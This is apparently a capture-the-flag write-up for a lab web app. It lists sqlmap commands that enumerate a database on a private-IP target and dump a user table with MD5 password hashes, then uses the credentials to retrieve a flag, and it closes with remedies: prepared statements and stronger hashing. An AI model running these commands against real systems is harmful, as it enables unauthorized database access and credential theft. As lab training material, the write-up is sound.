# Brute_Force
Brute Force for who, brute force for what, we don't need brute force. What we do need on the other hand is use sqlmap and get usernames and passwords.

## Example
This parts highlights a really nice sqlmap feature. Throught same means we can be able to retrieve a table in the database that has all the usernames and their passwords. Sqlmap decrypts the passwords for us(Brute Force).

## Commands
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a>
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --dbs
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --tables -D Member_Brute_Force
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --columns -D Member_Brute_Force -T db_default
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --dump -D Member_Brute_Force -T db_default

> options [Y, Y, D, N];

### usernames with cracked passwords
*root : 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
*admin: 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)

If we login using these in http://192.168.43.251/index.php?page=signin we get our flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

## Remedy
* Again preapred statements would have prevented us form getting this sort of information
* However a much stronger ecryptiion model other than md5 five which is really unsafe, would have made it harder to decryt these passwords :\.

## Resources
* https://www.youtube.com/watch?v=ciNHn38EyRc